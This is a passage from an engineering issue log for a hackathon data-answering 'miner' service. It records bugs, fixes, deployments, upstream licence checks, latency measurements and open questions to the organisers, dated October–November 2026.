  "operator error"; that answer is cached for 60 s. **2026-11-01:** it recurred on the first call to a fresh deployment (352 ms), so cold
  instances miss far more often than 1 in 10: both fixture runs on a new deployment hit it. Options: raise the deadline (latency cost), or make the fallback
  answer "ambiguous" below a margin. Not changed.
- **G245 — CONTENT_EXTRACTION ignored named fields when the text came in its own parameter. `FIXED, deployed 2026-11-01 (`130e16c`)`.** "Extract the invoice number, total, due date and contact email." named no
  field (the reader needed "… from …") and nothing read identifiers. Fixed in `content.ts`; 869/869 unit.
  Still open: a multi-category request repeats values across its "Also:" tails.
- **G246 — badssl.com's server resets about a third of TLS handshakes. `CAUSE FOUND (external); gates fixed;
  prose fix not deployed`.** From 2026-11-01 ~09:20 UTC `/ssl-check` answered `unreachable` for a different
  badssl.com host each run. Checked 11:10–11:20 UTC: production gives `unreachable_reason: ECONNRESET`. Every
  badssl host is one address (104.154.89.105), and **from this machine** a raw Node TLS handshake to it reset 7 of
  20 per host and timed out 1 (even successes took 0.9–4 s), while `expired-rsa-dv.ssl.com` answered 20/20. So it
  is badssl, not Vercel egress and not our code; real hosts are unaffected (github.com, ssl.com `valid`/`expired`).
  The miner does not retry: a second try costs a caller up to ~4 s on a host still failing a third of the time.
  Fix in the gates: `verify-deploy.mjs` and `intent-answers.mjs` retry a badssl case twice, then SKIP (the
  `ssl.test.ts` policy), and also grade `expired-rsa-dv.ssl.com`, which must pass. Against production 11:19 UTC:
  verify-deploy ALL PASSED (2 badssl SKIPs), intent answers 40/40.
  Found while checking: the untrusted answer denied a trusted root, then said the chain was "building a trusted
  path to a root", and failing verdicts started the chain sentence in lowercase. Fixed in `ssl.ts` (valid wording
  unchanged); unit 871/871 and live-checked locally on all five verdicts. Deployed 2026-11-01 as `5939c49`
  (`miner-1aoi3y0wt`). The last live test calling `expired.badssl.com` without a retry now uses ssl.com's host.

## 2026-10-31 "LiveCert is not on the rankings" — G235, G236, G237; G230 deployed

- **G235 — No miner is ranked in any of 4829's 36 intents, because no evaluator exists for their families.
  `OPEN, network-side`.** Devnode `/api/miners`, 2026-10-31 ~15:35 UTC: 1,875 registrations, 71 `scored: true`,
  every score in one of 7 families (FX_NOW, CODE_REVIEW, LLM_OUTPUT_EVALUATION, CUSTOMER_TICKET_RESOLUTION,
  TASK_EXECUTION_QUALITY, CONTRACT_OBLIGATION_AUDIT, THREAT_INTELLIGENCE). `/api/wasm` lists evaluator
  registrations for exactly those 7 families and no others (all now deregistered, superseded or rejected;
  `champion: null` on every one). 4829 (catalogue id 4433) is `active`, `scored: false`, with no `scores`
  field. Telegraph's own `txlens` and `telegraph-verity-intelligence`, which share 33 of our intents, are scored
  only on THREAT_INTELLIGENCE. So the absence is not our miner's fault and nothing in the miner changes it.
  - Two other causes ruled out: the grace period (docs: "doesn't appear on the leaderboard" for 7 days after
    activation; 4829's ends 2026-11-01 00:48 UTC, but miners registered the same night are scored) and
    liveness (spot checks pass on any non-empty answer; the watch is green).
  - What would change it: an accepted evaluator adapter for one of our families (Track 2 work, a $5 MACHINA
    bond and a 70% floor on 15 public pairs, per the rejection reasons in `/api/wasm`), or Telegraph adding one.
  - Epochs are now 5 minutes (`/api/epoch`: epoch 1934 at 15:39 UTC).
- **G236 — V2 moved the chain to Ethereum Sepolia. `OPEN, check before any on-chain step`.** The docs
  (`/docs/whats-new-v2`, `/docs/protocol/addresses-and-params`, read 2026-10-31): chain ID 11155111, Diamond
  `0x3624EB012B5E998BB57B6bE6C9Cfc9c4bc5eb99b`, test USDC anyone can mint, a MACHINA bond to register.
  `RULES_SEASON2.md`, `README.md` and WINNING.md's tutorial row named Base Sepolia (all corrected 2026-10-31). 4829 is `active` on
  the node, so the import carried it; that it sits on the new Diamond was not checked with `cast` (no RPC call
  made).
- **G237 — Does a live comparator make a deterministic family scored? `OPEN, hypothesis, test prepared`.** On-chain
  specs (`getIntentSpec`, read 2026-10-31) are well formed for WEATHER_CHECK_TEMPERATURE (AbsTol 2.0 °C),
  CRYPTO_PRICE_USD (RelTol 1%), CURRENCY_EXCHANGE_CONVERT (RelTol 0.5%) and SSL_VERIFICATION_CERT (PassFail). The
  first three also have ranking-half truth sources (1, 5 and 2) and are unscored. The only scored deterministic
  family, FX_NOW, is the only one that has had comparator modules registered (all now deregistered). n = 1, so this
  is a guess. The `onchain.ready:false` "no decimals" on CRYPTO/CURRENCY/STOCK is the jobs layout, not scoring.
  - **Test:** register our verified CRYPTO_PRICE comparator (`track2/SIGN_S2.md`, top section; $5 refundable bond).
    Confirmed if CRYPTO_PRICE_USD miners get `scores` within a few epochs of it going `active`; killed if it is
    `active` and nothing is scored after a day. Either way, ask Telegraph (draft in TASKS).
  - Truth sources are not the lever: another one for WEATHER_CHECK would join a pool that already has one.
- **G230 deployed 2026-10-31** (`330f2af`, `miner-h0lnck8v6`): six intents now answer `not_licensed` in whole or
  part. Evidence and the list: `track1-miner/docs/evidence/release-2026-10-31-licence-gates/`. The gates were
  changed to grade those refusals for honesty.

## 2026-10-29 rules re-read and the V2 docs on anjoman.ai — G218–G220; G203 closed; G208, G212 updated

Sources: hackathon.telegraphprotocol.com (/, /rules with every track tab, /timeline, /build, /intents) and
anjoman.ai/docs, read 2026-10-29 ~16:30–16:47 UTC. Recorded in `RULES_SEASON2.md` and TELEGRAPH_FACTS (top
section).

- **G218 — The prize-payment terms are not yet published. `OPEN, owner checks before Nov 1`.** /rules: eligible
  countries, identity and tax checks, payout methods "(including any wallet option)" and timing are "governed by
  the official prize-payment terms. Those terms must be available before the competition opens." No such page
  is linked from /, /rules or /build (2026-10-29). Unknown: whether India is eligible and how a prize is paid.
- **G219 — Anjoman and the miner docs disagree on what a miner is paid in. `OPEN, low stakes`.** Anjoman's Earn
  page says "Each answer it returns is paid in USDC". The V2 miner docs say the USDC is swapped to MACHINA over
  24 h and sent to the fee address, with a 100 USDC settlement minimum. Prizes do not depend on it. Earnings
  claims in the submission do (§05: claim earnings only "when the network records support them").
- **G220 — The V2 import changed 4829's `registered_at`. `OPEN, part of the G206 question`.** Devnode
  `/api/miners/4829` reports `registered_at` 2026-10-25T00:48:49Z (checked 2026-10-29 16:47 UTC). The activation
  was 2026-10-16. The overview page dates the grace period "after registration", and the registration page "after
  activation". If the import counts, the grace period runs to about 2026-11-01 00:49 UTC, the first hour of the
  event. Not verified; included in the question to the organisers (WINNING.md §8).

## 2026-10-26 G208 intent-swap draft — G212–G215

Evidence: `track1-miner/docs/evidence/g208-intent-swap-2026-10-26/`. Branch `claude/g208-intent-swap`; not deployed,
pushed or signed.

- **G212 — The validation API moved behind a login, and the console now updates through a smart wallet. `OPEN: asked
  Ahmed (owner sends)`.**
  - `POST integrate.telegraphprotocol.com/api/validate` returns an HTML 404 (2026-10-26 10:45 UTC), although
    the docs' `miners/validation-api` page (updated 2026-09-09) still documents it.
  - The console calls `backend.telegraphprotocol.com/registrations/validate` and `/registrations/miner/update`,
    and both need a bearer token: a call without one got 401.
  - The UI reads a `smartWalletAddress`. Registration 4829 is owned by EOA `0xdad2…a39e`, and only the registering
    address can update it (TELEGRAPH_FACTS).
  - Unknown: whether the console can update an EOA-owned registration, and whether any keyless validator remains.
  - Until answered, hard rule 3 (sandbox first) is met only by the owner signing in to the console.
  - **Re-checked 2026-10-29 16:45 UTC:** still an HTML 404. The V2 registration page (updated 2026-10-27) still
    documents the endpoint.
- **G217 — TOKEN_HOLDER_COUNT, a registered intent, fails on Base, Arbitrum and Polygon. `INVESTIGATED 2026-10-27;
  verdict and table fixes COMMITTED, NOT DEPLOYED; source change waits on the owner (Blockscout Pro key)`.** Full record: `track1-miner/docs/evidence/g217-holder-sources-2026-10-27/`.
  - **From Vercel's egress** (production receipts): `base`, `arbitrum` and `polygon.blockscout.com` return **HTTP
    403** in about 40 ms; `eth` and `optimism` return 200. The same three hosts serve a Cloudflare challenge to this
    machine, so the block is per host, not per caller.
  - **Measured alternatives:**
    - GeckoTerminal: all 5 chains, but −9% to +20% against Blockscout, 10 calls/min free, 9–25 s responses.
    - Ethplorer `freekey`: development use only.
    - Routescan: already ruled out (G116).

    None is recommended.
  - **Recommended:** a free Blockscout Pro API key (dev.blockscout.com, 5 req/s). With it,
    `api.blockscout.com/{chain_id}/api/v2/...` serves the same index on all chains; a keyless call returns 402 JSON,
    not a challenge. The owner creates the key; its terms are unread.
  - **Fixed 2026-10-27 ~18:40 UTC, committed, not deployed** (owner's yes, "Don't deploy yet"):
    - An outage is now `verdict: "unknown"`, `error: "upstream_unavailable"`; it was `not_found`.
    - Also fixed: with no chain named, chains that answered "no such token" plus chains that did not answer gave
      `not_found` with "The index answered" about chains that never answered. It is now `unknown` and names both
      sets. A count found with no chain named now says which chains were not compared.
    - `/token-holders` reads `KNOWN_TOKENS` (moved to `src/known-tokens.ts`, shared with `/token-supply`) before
      GeckoTerminal, and says which USDC/USDT contract was read.
    - Evidence: 5 offline unit tests (816/816); `local-probes.json`, six questions against live upstreams from a
      local build. A table symbol made no GeckoTerminal call, and CRV still went through it.
    - **Not verified on Vercel.** Base, Arbitrum and Polygon answers stay `unknown` until the source changes.
- **G213 — TOKEN_TOTAL_SUPPLY_VERIFY by symbol misses its < 500 ms target. `FIXED AND DEPLOYED 2026-10-27 ~14:39 UTC
  for table symbols (miner-6kvt9zv2p)`.**
  - On production: 8/8 table symbols took 83–277 ms of miner time, and addresses 137–162 ms. Symbols outside the
    table (CRV, MKR) still take 657–731 ms (`release-2026-10-27-g213/`).
  - **The fix:** `KNOWN_TOKENS`, 21 contracts across 5 chains. Each was checked against two independent sources
    (`track1-miner/docs/evidence/g213-token-table-2026-10-27/`).
  - **Found on the way:** Polygon symbol lookups never resolved. GeckoTerminal's `polygon_pos_` id prefix was cut at
    the first underscore. That is fixed too, and it also affects `/token-holders`.
  - **Still slow:** symbols outside the table still go through GeckoTerminal.
  - On production `miner-9ozpb4kgh`, four fresh symbol questions took 437, 867, 1207 and 3055 ms of miner time. By
    contract address it took 148–162 ms (`release-2026-10-26-g208/`).
  - GeckoTerminal symbol resolution dominates; it is cached 24 h per instance.
  - Candidate fix: a table of contract addresses for the major tokens on each chain, each one verified against the
    issuer's published address before it ships. A wrong entry would give a confident wrong answer.
- **G214 — KEYWORD_EXTRACTION is YAKE without part-of-speech tagging. `KNOWN LIMIT`.**
  - Verbs can rank: "deprecates" and "developed" in the 2026-10-26 checks.
  - English stop words only.
  - Unlike YAKE proper, phrases with inner stop words are dropped.
  - Same text, same ranking.
- **G215 — Terms for the new upstreams are partly unread. `OPEN`.**
  - FIRST EPSS: free, no registration, attribution requested in products (read 2026-10-26). The triage answer names
    it in `sources`.
  - Not read: Cloudflare and Google public DoH terms, and CISA KEV / CVE Program (cveawg) reuse terms. Both are US-government
    or public-service data; that is believed, not confirmed. Do not call them "licensed" until read.

## 2026-10-26 registered output schema — G211

- **G211 — The registered `output_schema` omits most of what the routes return. `OPEN, fix at the next updateMiner`.**
  - Against production on 2026-10-26, one question per route returned 101 top-level fields that
    `miner.yaml`'s `output_schema` does not name. All of `/company-registry`'s fields are missing, and so are
    `/convert`'s rate figures and `/sec-filings`' filing and figures.
  - The file is hashed into registration 4829, so it changes only with an `updateMiner`.
  - Until then, `docs/openapi.json` documents every field, typed from real answers
    (`track1-miner/docs/evidence/openapi-2026-10-26/`). Regenerate the manifest's schema from it at the update.

## 2026-10-25 intent conformance against the site's Intents page — G208–G210

Evidence: `track1-miner/docs/evidence/conformance-2026-10-25/` (README, `site-intents.json`, `latency.txt`).

- **G208 — 23 of our 36 intents are not on the hackathon site's Intents page. `CLOSED 2026-10-29 by the site`.**
  The /intents page now lists 134 intents, and all 36 of our families are among them. That was checked by script
  against the page text, 36/36, at 2026-10-29 ~16:50 UTC. Ahmed's "let us check" no longer matters. The record
  below is the 2026-10-25 state.
  The answer is pending (TELEGRAPH_FACTS item 11). Nothing is re-registered until it comes back.
  - The page lists 93 intents. Ours that are missing include WEB_SEARCH, FACT_CHECK, FINANCIAL_DATA,
    CONTENT_EXTRACTION and WEATHER_CHECK, though mission pages name them.
  - The organiser said on 2026-10-25 to build on the intents the site has.
  - Unknown: whether unlisted intents are judged or routed in Season II.
  - Listed siblings that our code already performs: ONCHAIN_METRIC_VERIFY (10 missions), VULNERABILITY_TRIAGE
    (10), FX_NOW, THREAT_IP_REPUTATION, DNS_RECORD_LOOKUP, TOKEN_TOTAL_SUPPLY_VERIFY, ENTITY_EXTRACTION and
    KEYWORD_EXTRACTION.
  - Registering any of them needs an `updateMiner` (owner, G206).
- **G209 — Four listed intents missed the site's latency target. `FIXED AND DEPLOYED 2026-10-25 for three; sanctions cold start is the owner's call`.**
  - **Found** on questions the miner had not seen, from India with the round trip subtracted:
    - SENTIMENT_ANALYSIS: 0.69–1.42 s against < 300 ms.
    - TEXT_CLASSIFICATION: up to 1.25 s against < 400 ms. Both were dominated by a Groq phrasing call that
      the code called a Season I scorer lottery ticket.
    - CURRENCY_EXCHANGE: 437 and 465 ms against < 250 ms.
    - SANCTIONS_SCREENING_MATCH: 3.35 s on the first call after a cold start, against < 500 ms.
  - **Fixed** on production `miner-8lwhe1wtl`:
    - a fast non-reasoning model with plain prompts;
    - the daily ECB table held for 10 minutes.

    All 39 measurements on fresh questions are within target (`conformance-2026-10-25/latency-after.txt`).
  - **Sanctions:** the lists are kept 6 h with a background refresh, so the 3.35 s is the one download each
    NEW function instance pays. The options are a scheduled warm-up ping (the uptime workflow is off at the
    owner's request, G205) or a deploy-time snapshot, which risks screening against a stale list.
  - **Not measured:** p90 over many questions, and latency from a US caller. A second run of repeated
    questions was answered from `llm.ts`'s 10-minute model-reply cache and was discarded.
- **G210 — Five answers the latency re-measure surfaced. `CHECKED 2026-10-25; four fixed and DEPLOYED 2026-10-25 ~18:35 UTC (production miner-l5taibkkl)`.**
  All five were re-checked on public production: `release-2026-10-25-g210/`. A missed model deadline is cached
  like any answer for up to 60 s, so a cold `ambiguous` can repeat for a minute (seen on the exoplanet question).
  Each was checked against GLEIF, EDGAR or URLhaus itself: `track1-miner/docs/evidence/g210-2026-10-25/`.
  - **Nvidia:** the registry subject kept "an"; fixed.
  - **Coca-Cola 10-K:** SEC's `"USD": {}` crashed the route, and the crash was reported as an outage; fixed.
  - **Two classifications came back `ambiguous`:** the model now decides where the word list declines, and
    may answer "none". It scores 22/24 against 16/24, at the cost of one of four contentless texts being
    labelled.
  - **URLhaus retired its free downloads (410 Gone) and its API needs a key.** Every clean URL on URL_SAFE and
    URL_SCAN was answered "could not be judged". URLhaus is removed, and "safe" now needs Cloudflare and Quad9
    both to answer.
  - **Open: the deployed `miner.yaml` still describes URLhaus.** It is hashed into registration 4829 (G86), so
    it changes only with the next `updateMiner`. URLhaus can come back with an abuse.ch Auth-Key; its terms
    are unread.
  - **Coverage limit, not a defect:** Google's Safe Browsing test page is listed only by Google Safe Browsing,
    which we do not consult.

## 2026-10-24 licence ledger and source swaps — G230–G234 (G208–G212 on the branch)

Merged into `codex/rank1-14-intents` on 2026-10-29 on the owner's yes ("Merge it"). The branch numbered these
G208–G212, which codex had already used, so they were renumbered G230–G234 here and in the code comments. Still
NOT deployed. **What the merge itself changed:**
- Every answer now carries the receipt and the `licensing` field. The daily ECB table is still held for ten
  minutes (G209), and Frankfurter replaces open.er-api for currencies the ECB does not publish. Geo keeps its DNS
  read-notes behind the licence gates.
- The ledger met codex's newer routes:
  - `/dns`, `/token-supply`, `/keywords` and `/vuln-triage` were added to `ENDPOINT_SOURCES`. A new test fails
    when a declared endpoint has no ledger entry.
  - CISA KEV and FIRST EPSS (`/vuln-triage`) are registered as **unread** (G233).
  - URLhaus was removed, because codex stopped calling it on 2026-10-25.
- **`/token-holders` for a symbol outside the built-in table** now resolves through Blockscout's own search, not
  GeckoTerminal. Codex measured on 2026-09-10 that this search did not return inside the budget from Vercel's
  egress, so expect `unknown` there on production. Tokens in `KNOWN_TOKENS` are unaffected.
- **`/ip-geolocate` answers only reserved ranges.** Every public address gets `not_licensed`, so the IP Tokyo pin
  in `intent-answers.mjs` and the public-address probes will fail at the next release. The same applies to the
  `/stock-price`, `/headlines` and `/news-search` probes. Update those gates to expect `not_licensed` before
  deploying, or the release gate will read as a regression.
- `docs/openapi.json` does not yet document the `licensing` field.
- Unit tests 852/852 and `tsc --noEmit` clean on the merge (worktree `gallant-allen-3589e4`, 2026-10-29).

Branch `claude/licensed-sources`. Every upstream is now registered in `track1-miner/miner/src/sources.ts` with its
terms page, the date it was read and a verdict. The ledger is served at `/sources`, and every answer carries a
`licensing` field (its endpoint's weakest upstream, plus any notice the terms require). `test/sources.test.ts`
fails when a fetched host has no entry. It sees only URLs written out in full, not ones built from host lists.
Terms pages are saved offline under `C:\tgw\terms` and `C:\tgw\terms2`. Nothing here is deployed.

- **G230 — 8 of 35 endpoints draw on a source whose terms bar paid use. `OPEN, owner decision`.** Counted by
  the import graph, which over-counts: an endpoint can look less licensed than it is, never more.
  - `/ip-geolocate`: ip-api, ipwho.is and ipinfo, all barred (read 2026-10-23/24). Candidate: ipquery.io, whose
    only grant is an FAQ line ("without restriction"), with no terms page.
  - `/stock-price` and `/financial`: Yahoo (barred), CoinGecko (barred), Nasdaq (unread).
  - `/headlines`, `/news-search`, `/web-search`: Google News RSS (barred, G189).
  - `/token-holders`: GeckoTerminal, under CoinGecko's API terms (barred).
  - `/event-outcome`: Manifold (barred: "non-commercial use are permitted"); Polymarket unread, because it was
    unreachable from this network.
  - Options per endpoint: a licensed replacement, answer `not_licensed` (the G186 convention), or drop the
    intent.
  - **UPDATE 2026-10-24: decided "answer not_licensed"; `CODE DONE on claude/licensed-sources, NOT deployed`.**
    `permitted(url)` in sources.ts gates every call, so a barred source is never called and the registry is the
    switch. Each endpoint falls back to what is still licensed:
    - `/ip-geolocate` answers reserved ranges only;
    - `/financial` answers SEC-filing figures only;
    - `/token-holders` resolves through Blockscout;
    - `/web-search` uses Wikipedia and the docs, and never says news was searched;
    - `/event-outcome` searches Polymarket only;
    - `/stock-price`, `/headlines` and `/news-search` refuse everything (SERVES_NOTHING).
  - Nasdaq was read the same day and is barred too ("personal, non-commercial use").
  - Endpoint statuses after the gates: 4 licensed, 7 conditional, 11 unclear, 10 unread, 3 barred.
  - `test/licence-gates.test.ts` proves no barred host is called. The gated paths' own tests open the gate
    per file (`test/licence-fixtures.ts`).
  - **Cost:** answers on these intents drop until a licensed source exists. Live tests for the gated paths
    were not re-run.
- **G231 — OpenAlex now meters keyless calls. `OPEN, owner: create a free key`.** Keyless requests share
  "$0.10" a day per IP (about 100 calls), and Vercel's egress IPs are shared. Production sets no
  `OPENALEX_API_KEY` (env names read 2026-10-24); a free key gets $1 a day. `/papers` answered correctly
  on 2026-10-24, so the pool was not empty then. No mission buys ACADEMIC_SEARCH.
- **G232 — Bitstamp's bot wall. `OPEN, untested from Vercel`.** It returned 503 after about six requests within
  seconds from this machine, and cleared seconds later. It is mitigated by a 10 s per-pair cache and reported
  as an outage, never as a price. Question 3 of the DLA email asks Bitstamp about datacenter IPs.
- **G233 — 12 sources unread, 8 unclear. `OPEN, Claude next`.**
  - Unread: dRPC, Merkle, 1RPC, Routescan, LayerZero Scan, OpenChain, ENS Ideas, Eurostat, NY Fed,
    Polymarket, Blockscout (found 2026-10-24: its hosts are assembled in code), and the doc sites
    websearch.ts quotes. Nasdaq was read later that day and is barred.
  - Unclear: PublicNode, the chains' own RPCs, Flashbots, URLhaus, the DNS resolvers, the UN list,
    ClinicalTrials.gov and Groq (G197).
  - Two conditions are not fully met. The SEC user agent carries no contact (SEC's exact wording was not
    read), so `met: unchecked`. MITRE's licence is linked, not reproduced, so `met: partly`.
- **G234 — `/papers` repeats an author's name. `OPEN, quality`.** On 2026-10-24 production listed "Matin
  Chehelgerdi" three times for one paper. This is either OpenAlex's own author list or our parsing; not traced.

## 2026-10-22/23 Season II rules published, audit release — G203–G207

The Miner and Evaluator rubrics are now on hackathon.telegraphprotocol.com/rules (read 2026-10-22 16:47 UTC).
They are recorded in `RULES_SEASON2.md`; the strategy built on them is in `WINNING.md`. G200–G202 are on
branch `claude/correctness-audit-2026-10-21`, not yet merged here.

- **G203 — The organiser's pages disagree. `CLOSED 2026-10-29`.** /rules, /timeline and the home page now agree:
  the deadline is Dec 1 23:59 UTC and the prize pool is $10,000 ($7,000 main, plus $3,000 for separate December
  challenges). /judging returns 404. Only the track numbering still differs between pages, and it costs
  nothing. The 2026-10-22 state follows. All read 2026-10-22; the table was in `RULES_SEASON2.md`.
  - Deadline: /rules says Nov 1 – Dec 20 with final submission **Dec 20 23:59 UTC**; /timeline and the home
    page say 1 Nov – 1 Dec.
  - Prize pool: /rules says $10,000; the home page says $15,000.
  - Track numbers: /rules has 02 Miners and 03 Evaluators; /tracks has 01 and 02.
  - /judging carries an older Apps rubric.
  - We plan to 1 Dec 23:59 UTC and the /rules prizes until the organisers confirm in writing. The message is
    drafted in WINNING.md §8.
- **G206 — Does `updateMiner` restart the 7-day grace period? `CLOSED 2026-11-05`: the organiser says there is no
  grace period for a new or updated miner (TELEGRAPH_FACTS item 12; the docs disagree, G261).** The
  Oct 24 Option A window passed unsigned, so 4829 is frozen for the season unless this is answered. The V2 import
  may itself have reset the date (G220). The same
  reply settled that miners carry over to v2 unchanged (TELEGRAPH_FACTS item 10), so the v2 migration itself costs
  registration 4829 nothing. Only a voluntary update still carries this risk. The
  miner docs give a 7-day grace period "after activation": no leaderboard, and a shared 5% of routed
  traffic. `updateMiner` deregisters and re-registers with a new `registrationId`. The docs do not say
  whether that resets the period. If it does, an update in November costs a week of ranked routing.
  WINNING.md §8 gives two options: sign by Oct 24 23:59 UTC, or freeze registration 4829 for the season.
  Registration 4829 activated 2026-10-16 09:59 UTC, so its own grace period ends about 2026-10-23 10:00 UTC.
  Season I evidence (G58, recorded 2026-09-01): a new registration was scored in the next epoch's pass, the
  same day, so the grace period limits routed **traffic share**, not scoring. The risk is a week of reduced
  routed demand, not a week without a score.
- **G204 — Related-party consumption evidence against folder override 2. `OPEN, owner decision`.**
  - The Miner rubric gives 1 consumption point for use by an H2 mission app "including an application
    operated by the Provider's own team".
  - Repeated use (2), ranked routing (2) and accounting (2) do not require independence. "Related-party
    activity may establish functional consumption but does not receive the additional independent-consumer
    points."
  - So up to 7 of 10 points are reachable with our own disclosed app. Override 2 says nothing we control
    counts as a user or as volume.
  - WINNING.md A4 proposes labelling it related-party and never as users or volume. The owner decides
    whether to build it.
- **G205 — No availability record for the 20 reliability points. `OPEN, owner decision`.** The `uptime`
  workflow has been `disabled_manually` since 2026-10-01 at the owner's request. Reliability, availability
  and capacity are 20 of the Miner's 100 points. Resuming a record from Nov 1, and adding a capacity test,
  needs the owner's yes. Not measured: Vercel plan limits under concurrent load.
  - **2026-10-27: no free passive record exists.** Each route was checked:
    - `vercel logs` keeps about an hour, and only invocations that printed something.
    - `vercel metrics vercel.request.count` answers `payment_required`: it needs Observability Plus, on Pro.
    - Neither devnode `/api/miners/4829` nor the explorer API publishes spot-check or liveness history.

    The options, all the owner's call:
    1. re-enable the `uptime` workflow;
    2. pay for Vercel Pro;
    3. let the miner write its own request counts to a free store, which needs an account Claude cannot create.
- **G207 — Timeless web-search questions quote the wrong Wikipedia article. `OPEN, next WEB_SEARCH fix`.** Seen
  on preview `miner-qazd6wyp9`, 2026-10-23:
  - "Who wrote Pride and Prejudice?" quoted *Pride and Prejudice and Zombies (film)*;
  - "What is the capital of Australia?" quoted the ACT article without naming Canberra;
  - the Mona Lisa and telephone questions came out right.

  The cause is not yet traced: the article is picked inside the timeless path added in `deaac8e`. WEB_SEARCH is
  bought by 7 missions, so this is the highest-value open quality item. Evidence:
  `track1-miner/docs/evidence/release-2026-10-23/`.

  **UPDATE 2026-10-24: `FIXED, DEPLOYED 2026-10-24`** (production `miner-e2999tb2p` from `8d121e9`; the preview
  `miner-qofu599bo` quoted the right article for all three questions above; `docs/evidence/release-2026-10-24/`).
  - **Traced.** The defect is in `qa.ts`'s quoting fallback, which serves both WEB_SEARCH and
    QUESTION_ANSWERING. When there is no model answer, the answer is the sentence sharing the most words with
    the question, and a tie goes to Wikipedia's first hit. That hit is often a film, a band or "Capital
    punishment in Canada".
  - **Where it shows.** The preview had no Groq key: `GROQ_API_KEY` is set for Production only (`vercel env
    ls`, 2026-10-24). Production also falls back. In one run of the 20 questions it served the Four Seasons
    band, the *Boiling Point* film and *A Walk on the Moon*. Not established: whether that run's load on the
    shared key caused the fallback.
  - **Fix.** Sentence ranking only; the sources searched and sent to the model are unchanged, except that
    disambiguation pages are dropped:
    - the title's fit is a quarter-point tie-break;
    - a sentence defining a film or band costs 1.5 when the question is about neither;
    - words are matched on rough stems (painted and painting);
    - an equal score goes to the shorter sentence;
    - extracts are cut at a sentence end.

    An earlier attempt also changed the sources (re-sorting, and searching a lone name). It broke the model
    path for the Moon question, so it was reverted.
  - **Measured on 20 questions.** No model: 11 correct, 1 partial, 8 wrong before; 18 correct, 2 partial,
    0 wrong after. Model: the branch 20/20, production 17/20 in the same minutes. Unit tests 791/791.
    Evidence: `track1-miner/docs/evidence/g207-2026-10-24/`.
  - **Still open:** these are 20 hand-picked questions, not routed traffic, and the 154-question audit has
    not been re-run.

## 2026-10-21 correctness audit — G200–G202

Audit of all 36 intents, 154 questions (routed and realistic) against production `miner-q5qepqluk`, each
compared with its primary source: `track1-miner/docs/evidence/correctness-audit-2026-10-21/`. Production:
**110 pass, 17 partial, 27 fail**. 22 of the 27 fails are fixed on branch `claude/correctness-audit-2026-10-21`
(17 code commits from `220463a` to `a0b2847`, unit 771 → 787), plus one partial (storm precipitation
label); Cape Town's was already fixed by the undeployed places table. **None deployed.**

- **G200 — Fails and partials NOT fixed. `OPEN`.** Recommendation for each: fix, not drop — every one is a
  retrieval or reading defect, and each intent passed its in-scope questions otherwise.
  - **UPDATE 2026-10-26: RESEARCH_QUERY fixed on branch claude/miner-s2-conformance, NOT deployed.** Merged into
    `codex/rank1-14-intents` on 2026-10-29 (unit tests 822/822); still NOT deployed.
    - All three audit fails are now right: Nivolumab's bladder trial, the creatine-and-cognition review, and
      Pakistan declined as a political decision.
    - Replay of the 99 routed questions: 47 leads changed, mostly to the trial or paper on the thing asked, or
      to an honest "no evidence". Four are still weak.
    - Evidence: `track1-miner/docs/evidence/research-g200-2026-10-26/`.
  - RESEARCH_QUERY, 3 of 4 fail: the subject collapses to one entity and drops the qualifier, so
    "Nivolumab … bladder cancer" got a head-and-neck trial, "Pakistan sanction Iran" a root-canal trial in
    Iran, and "creatine and cognition" a beetroot-juice review. Needs: require trials and papers to name the
    qualifier (condition, outcome) as well as the entity, and decline a policy question. Highest-value open item
    (99 routed questions).
  - ACADEMIC_SEARCH: a title lookup ("Attention Is All You Need") returns five unrelated papers though
    OpenAlex's own search ranks it first (78,168 citations); "do academic search for X" keeps "do search"
    in the topic; the federated-learning question gets defence papers for an attacks question.
    **UPDATE 2026-10-24, DEPLOYED 2026-10-24** (production `miner-e2999tb2p`).
    - **Title lookup fixed.** A quotation tied to "paper", "titled" and the like is searched alone. An
      exact-title match is served first. With no exact match, the answer says so at confidence 0.4.
    - **"do academic search for X" fixed.**
    - **Live OpenAlex check:** both audit fails are now right, and three regression questions are unchanged.
      Evidence: `track1-miner/docs/evidence/g200-academic-2026-10-24/`.
    - **Still open:** the federated-learning attacks-vs-defences question.
    - **New data caveat:** OpenAlex records *Attention Is All You Need* as published in 2025, not 2017. We
      pass its year through unchanged.
  - FINANCIAL_DATA: "Will Pfizer's ZAVZPRET sales exceed forecasts?" answers Pfizer's total revenue. A
    product-level or forecast question should be declined by name.
  - Partials: SSL for an unresolvable name leads with openssl how-to rather than "does not resolve"; URL_SAFE
    calls an NXDOMAIN host "not listed" without saying it does not resolve; WEATHER_CHECK "Will Riyadh reach
    40°C today?" gives the range but never says no; NEWS_HEADLINES reads "Storage" as a region;
    FRAUD_DETECTION calls an empty address "elevated risk" for having no history; TEXT_CLASSIFICATION
    refuses a topic classification with no labels; SENTIMENT answers a virality question as sentiment;
    RESEARCH_SYNTHESIS quotes background sentences as findings; CONTENT_EXTRACTION's multi-kind summary repeats
    values and misses "1,200 units"; FACT_CHECK quotes an unrelated article for a forecast ("Violence begets
    violence"). FACT_CHECK's Great Wall myth is now `unverified`, not `contradicted`.
- **G201 — Production's OFAC aliases were missing. `FIXED, DEPLOYED 2026-10-23` (production `miner-n9d4aoxw8`; the preview matched "Rosneft").** "Rosneft" answered
  `no_match` although `ROSNEFT` is an alias of SDN entry 17022; locally, with alt.csv, it scores 1.0. So the
  production instance had parsed SDN.CSV without ALT.CSV (the alias download failed silently) and cached
  that as complete — every alias-only name was cleared. `220463a` makes a failed alias download an unread
  list. **Until deployed, production SANCTIONS name screens can clear aliased parties.** Not measured: how
  long production had served the alias-less list. Likely cause, inferred: the 9 s `SANCTIONS_TIMEOUT_MS`
  against downloads measured at 8.0 s (SDN.CSV, 5.7 MB) and 4.3 s (ALT.CSV) from this machine; in the branch
  replay the OFAC read failed once and the UN read failed twice. With the fix that is an honest "not
  cleared", but a longer timeout or a background refresh would make it rarer.
- **G202 — Deploy notes for the audit branch. `DEPLOYED 2026-10-23`; (2) the ip-api and ipinfo terms are still unread.** (1) `/ip-geolocate` now answers anycast addresses as
  anycast, so `no-regression.mjs` will show 8.8.8.8 differing from production by design, and
  `intent-answers.mjs` now requires `verdict: anycast` for 8.8.8.8 (passes on the branch, fails on current
  production). (2) The anycast flag comes from ipinfo, whose terms are still unread (G189), as are ip-api's;
  ip-api's free endpoint is believed non-commercial — **from memory, not read**: its legal page did not load
  from this machine on 2026-10-21. (3) Web search now calls the `/answer` path for timeless questions; with no
  Groq key it falls back to a quoted sentence, as `/answer` does.

## 2026-10-21 places table and Nominatim policy — G196 update, G198–G199

